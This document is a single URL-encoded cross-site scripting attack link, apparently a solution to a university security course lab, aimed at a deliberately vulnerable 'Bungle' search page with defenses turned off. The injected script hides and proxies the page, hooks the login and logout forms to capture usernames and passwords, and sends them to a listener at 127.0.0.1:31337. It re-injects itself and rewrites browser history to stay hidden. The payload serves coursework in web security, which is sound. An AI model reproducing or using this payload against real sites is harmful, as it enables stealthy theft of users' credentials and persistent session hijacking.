http://bungle-cs461.csl.illinois.edu/./search?xssdefense=0&q=%3Cscript%3Efunction%20payload(attacker)%20%7B%0A%09%09%09function%20log(data)%20%7B%0A%09%09%09%09console.log(%24.param(data))%3B%0A%09%09%09%09%24.get(attacker%2C%20data)%3B%0A%09%09%09%7D%0A%09%09%09%0A%09%09%09function%20logInListener(event)%20%7B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09var%20message%20%3D%20new%20Object()%3B%0A%09%09%09%09message.event%20%3D%20%22login%22%3B%0A%09%09%09%09if%20(document.getElementById(%22log-in-btn%22))%20%7B%0A%09%09%09%09%09var%20user%20%3D%20document.getElementById(%22username%22).value%3B%0A%09%09%09%09%09message.user%20%3D%20user%3B%0A%09%09%09%09%7D%0A%09%09%09%09if%20(document.getElementById(%22log-in-btn%22))%20%7B%0A%09%09%09%09%09var%20pass%20%3D%20document.getElementById(%22userpass%22).value%3B%0A%09%09%09%09%09message.pass%20%3D%20pass%3B%0A%09%09%09%09%7D%0A%09%09%09%09log(message)%3B%0A%09%09%09%09window.removeEventListener(%22submit%22%2C%20logInListener)%3B%0A%09%09%09%09%24.ajax(%7B%0A%09%09%09%09%09type%3A%20%22POST%22%2C%0A%09%09%09%09%09data%3A%20%7B%22username%22%3A%20user%2C%20%22password%22%3A%20pass%7D%2C%0A%09%09%09%09%09url%3A%20%22http%3A%2F%2Fbungle-cs461.csl.illinois.edu%2Flogin%3Fxssdefense%3D0%22%20%0A%09%09%09%09%7D).done(function%20(data)%20%7B%0A%09%09%09%09%09var%20url%20%3D%22http%3A%2F%2Fbungle-cs461.csl.illinois.edu%2Fsearch%3Fxssdefense%3D0%22%20%2B%0A%09%09%09%09%09%09%22%26q%3D%22%20%2B%20encodeURIComponent(%22%3Cscript%22%20%2B%20%22%3E%22%20%2B%20payload.toString()%20%2B%20%0A%09%09%09%09%09%09%22%3Bpayload(%5C%22%22%20%2B%20attacker%20%2B%20%22%5C%22)%3B%3C%2Fscript%22%20%2B%20%22%3E%22)%3B%0A%09%09%09%09%09%24.ajax(%7B%0A%09%09%09%09%09%09type%3A%20%22GET%22%2C%0A%09%09%09%09%09%09url%3A%20url%0A%09%09%09%09%09%09%7D).done(function%20(data)%20%7B%0A%09%09%09%09%09%09proxy(%22.%2F%22)%3B%0A%09%09%09%09%09%7D)%3B%0A%09%09%09%09%7D)%3B%0A%09%09%09%7D%0A%09%09%09%0A%09%09%09function%20logOutListener(event)%20%7B%0A%09%09%09%09event.preventDefault()%3B%0A%09%09%09%09var%20message%20%3D%20new%20Object()%3B%0A%09%09%09%09message.event%20%3D%20%22logout%22%3B%0A%09%09%09%09message.user%20%3D%20document.getElementById(%22logged-in-user%22).innerHTML%3B%0A%09%09%09%09log(message)%3B%0A%09%09%09%09window.removeEventListener(%22submit%22%2C%20logOutListener)%3B%0A%09%09%09%09%24.ajax(%7B%0A%09%09%09%09%09type%3A%20%22POST%22%2C%0A%09%09%09%09%09url%3A%20%22http%3A%2F%2Fbungle-cs461.csl.illinois.edu%2Flogout%3Fxssdefense%3D0%22%20%0A%09%09%09%09%7D).done(function%20(data)%20%7B%0A%09%09%09%09%09var%20url%20%3D%22http%3A%2F%2Fbungle-cs461.csl.illinois.edu%2Fsearch%3Fxssdefense%3D0%22%20%2B%0A%09%09%09%09%09%09%22%26q%3D%22%20%2B%20encodeURIComponent(%22%3Cscript%22%20%2B%20%22%3E%22%20%2B%20payload.toString()%20%2B%20%0A%09%09%09%09%09%09%22%3Bpayload(%5C%22%22%20%2B%20attacker%20%2B%20%22%5C%22)%3B%3C%2Fscript%22%20%2B%20%22%3E%22)%3B%0A%09%09%09%09%09%24.ajax(%7B%0A%09%09%09%09%09%09type%3A%20%22GET%22%2C%0A%09%09%09%09%09%09url%3A%20url%0A%09%09%09%09%09%7D).done(function%20(data)%20%7B%0A%09%09%09%09%09%09proxy(%22.%2F%22)%3B%0A%09%09%09%09%09%7D)%3B%0A%09%09%09%09%7D)%3B%0A%09%09%09%7D%0A%09%09%09%0A%09%09%09function%20proxy(href)%20%7B%0A%09%09%09%09%24(%22html%22).load(href%2C%20function(res)%20%7B%0A%09%09%09%09%09%24(%22html%22).show()%3B%0A%09%09%09%09%09log(%7B%22event%22%3A%20%22nav%22%2C%20%22url%22%3A%20href%7D)%3B%0A%09%09%09%09%09%24(%22%23query%22).val(%22pwned!%22)%3B%0A%09%09%09%09%09%2F%2F%20Login%20listener%0A%09%09%09%09%09if%20(document.getElementById(%22log-in-btn%22))%20%7B%0A%09%09%09%09%09%09window.addEventListener(%22submit%22%2C%20logInListener)%3B%0A%09%09%09%09%09%7D%0A%09%09%09%09%09%0A%09%09%09%09%09if%20(document.getElementById(%22log-out-btn%22))%20%7B%0A%09%09%09%09%09%09window.addEventListener(%22submit%22%2C%20logOutListener)%3B%0A%09%09%09%09%09%7D%0A%09%09%09%09%09window.history.replaceState(null%2C%20'Bungle!'%2C%0A%09%09%09%09%09%09'http%3A%2F%2Fbungle-cs461.csl.illinois.edu%2F')%3B%0A%09%09%09%09%7D)%3B%0A%09%09%09%7D%0A%09%09%09%24(%22html%22).hide()%3B%0A%09%09%09proxy(%22.%2F%22)%3B%0A%09%09%7D%3Bpayload(%22http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%22)%3B%3C%2Fscript%3E
